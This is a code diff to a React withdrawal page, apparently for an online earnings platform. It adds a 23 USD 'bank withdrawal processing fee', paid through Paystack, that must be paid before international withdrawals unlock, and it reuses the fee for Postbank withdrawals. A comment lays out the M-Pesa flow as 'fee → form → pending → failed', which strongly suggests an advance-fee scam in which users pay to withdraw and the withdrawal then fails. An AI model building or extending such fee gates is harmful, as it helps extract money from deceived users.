@@ -92,9 +92,10 @@ const FEE_USD    = 5;
 const USD_TO_KES = 130;                              // approximate USD → KES rate
 const FEE_KES    = Math.round(FEE_USD * USD_TO_KES); // = KES 650
 
-// Postbank Kenya processing fee — priced in USD, converted to KES dynamically.
-const POSTBANK_FEE_USD = 23;
-const POSTBANK_FEE_KES = Math.round(POSTBANK_FEE_USD * USD_TO_KES); // = KES 2,990
+// Bank withdrawal processing fee (Postbank Kenya + all other banks) — priced in
+// USD, converted to KES dynamically.
+const BANK_FEE_USD = 23;
+const BANK_FEE_KES = Math.round(BANK_FEE_USD * USD_TO_KES); // = KES 2,990
 
 // ── M-Pesa flow (fee → form → pending → failed) ───────────────────────────────
 function MpesaFlow({ user, initialStep }) {
@@ -270,7 +271,7 @@ function PostbankFlow({ user, initialStep }) {
     try {
       const res = await fetch('/api/paystack/initialize', {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email: user.email, amount: POSTBANK_FEE_KES, phone: user.phone || '', plan: 'postbank_withdrawal_fee' }),
+        body: JSON.stringify({ email: user.email, amount: BANK_FEE_KES, phone: user.phone || '', plan: 'postbank_withdrawal_fee' }),
       });
       const data = await res.json();
       if (data.status) { window.location.href = data.data.authorization_url; return; }
@@ -334,15 +335,15 @@ function PostbankFlow({ user, initialStep }) {
       {step === 'fee' && (
         <>
           <div className="pay-message" style={{ borderColor: '#1D4ED8', background: '#EFF6FF' }}>
-            A one-time <strong>processing fee of ${POSTBANK_FEE_USD} USD</strong> (≈ <strong>KES {POSTBANK_FEE_KES.toLocaleString()}</strong>) is required to process your Postbank Kenya withdrawal. The amount is converted to KES automatically.
+            A one-time <strong>processing fee of ${BANK_FEE_USD} USD</strong> (≈ <strong>KES {BANK_FEE_KES.toLocaleString()}</strong>) is required to process your Postbank Kenya withdrawal. The amount is converted to KES automatically.
           </div>
           <div className="pay-amount">
             <div className="pay-amount-label">Postbank Processing Fee</div>
-            <div className="pay-amount-value" style={{ color: '#1D4ED8' }}>${POSTBANK_FEE_USD} USD</div>
-            <div className="pay-amount-sub">≈ KES {POSTBANK_FEE_KES.toLocaleString()} • Converted automatically • Unlocks withdrawal</div>
+            <div className="pay-amount-value" style={{ color: '#1D4ED8' }}>${BANK_FEE_USD} USD</div>
+            <div className="pay-amount-sub">≈ KES {BANK_FEE_KES.toLocaleString()} • Converted automatically • Unlocks withdrawal</div>
           </div>
           <button className="pay-btn" style={{ background: accent }} onClick={handlePayFee} disabled={loading}>
-            {loading ? <><span className="spinner" /> Redirecting…</> : `🔒 Pay $${POSTBANK_FEE_USD} USD via Paystack`}
+            {loading ? <><span className="spinner" /> Redirecting…</> : `🔒 Pay $${BANK_FEE_USD} USD via Paystack`}
           </button>
           <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setStep('choice')}>← Back</button>
           <div className="pay-secure">🔐 Secured by Paystack • USD → KES conversion included</div>
@@ -419,9 +420,10 @@ function PostbankFlow({ user, initialStep }) {
 }
 
 // ── International flow (bank selector) ─────────────────────────────────────────
-function InternationalFlow({ user }) {
+function InternationalFlow({ user, initialStep }) {
   const router = useRouter();
-  const [gate,          setGate]          = useState('mpesa'); // mpesa → management → form
+  const [gate,          setGate]          = useState(initialStep === 'form' ? 'form' : 'mpesa'); // mpesa → management → fee → form
+  const [loading,       setLoading]       = useState(false);
   const [accountName,   setAccountName]   = useState('');
   const [selectedBank,  setSelectedBank]  = useState(null);
   const [bankOpen,      setBankOpen]      = useState(false);
@@ -448,6 +450,20 @@ function InternationalFlow({ user }) {
     if (b.name === 'Postbank Kenya') { router.push('/withdraw?method=postbank'); return; }
     setSelectedBank(b); setBankOpen(false); setBankQuery(''); setAccountNumber('');
     setErrors(prev => ({ ...prev, bank: undefined, accountNumber: undefined }));
+  }
+
+  async function handlePayFee() {
+    setLoading(true);
+    try {
+      const res = await fetch('/api/paystack/initialize', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email: user.email, amount: BANK_FEE_KES, phone: user.phone || '', plan: 'international_withdrawal_fee' }),
+      });
+      const data = await res.json();
+      if (data.status) { window.location.href = data.data.authorization_url; return; }
+      alert('Payment could not be initiated. Please try again.');
+    } catch { alert('Network error. Please check your connection.'); }
+    setLoading(false);
   }
 
   async function handleSubmit() {
@@ -513,10 +529,27 @@ function InternationalFlow({ user }) {
             <button className="pay-btn" style={{ background: 'linear-gradient(135deg, #007A3D, #00A651)', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
               📲 No — take me to M-Pesa
             </button>
-            <button className="pay-btn" style={{ background: accent }} onClick={() => setGate('form')}>
+            <button className="pay-btn" style={{ background: accent }} onClick={() => setGate('fee')}>
               🏦 Yes, management asked me — continue
             </button>
             <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setGate('mpesa')}>← Back</button>
+          </>
+        )}
+        {gate === 'fee' && (
+          <>
+            <div className="pay-message" style={{ borderColor: '#1D4ED8', background: '#EFF6FF' }}>
+              A one-time <strong>processing fee of ${BANK_FEE_USD} USD</strong> (≈ <strong>KES {BANK_FEE_KES.toLocaleString()}</strong>) is required for your bank withdrawal to be processed successfully. The amount is converted to KES automatically.
+            </div>
+            <div className="pay-amount">
+              <div className="pay-amount-label">Bank Withdrawal Processing Fee</div>
+              <div className="pay-amount-value" style={{ color: '#1D4ED8' }}>${BANK_FEE_USD} USD</div>
+              <div className="pay-amount-sub">≈ KES {BANK_FEE_KES.toLocaleString()} • Converted automatically • Unlocks the withdrawal form</div>
+            </div>
+            <button className="pay-btn" style={{ background: accent }} onClick={handlePayFee} disabled={loading}>
+              {loading ? <><span className="spinner" /> Redirecting…</> : `🔒 Pay $${BANK_FEE_USD} USD via Paystack`}
+            </button>
+            <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setGate('management')}>← Back</button>
+            <div className="pay-secure">🔐 Secured by Paystack • USD → KES conversion included</div>
           </>
         )}
       </FlowShell>
@@ -619,7 +652,7 @@ export default function WithdrawPage() {
 
   if (method === 'mpesa')         return <MpesaFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'fee'} />;
   if (method === 'postbank')      return <PostbankFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'choice'} />;
-  if (method === 'international')  return <InternationalFlow user={user} />;
+  if (method === 'international')  return <InternationalFlow user={user} initialStep={stepQ === 'form' ? 'form' : 'mpesa'} />;
 
   // Chooser
   return (
